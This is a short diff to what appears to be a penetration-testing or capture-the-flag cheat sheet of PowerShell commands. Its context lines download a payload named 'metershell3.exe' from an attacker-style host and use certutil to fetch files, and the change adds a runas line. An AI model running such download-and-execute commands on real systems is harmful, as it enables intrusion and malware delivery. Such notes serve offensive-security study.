@@ -642,6 +642,8 @@ f.) Some other Powershell commands:
 Download a file:
 powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.31:8000/metershell3.exe', 'metershell3.exe')"
 certutil -urlcache -f URL-link/file.txt file.txt
+Run Powershell as another user:
+runas /user:domain\username "powershell.exe"
 
 g.) RSA Key - 
 
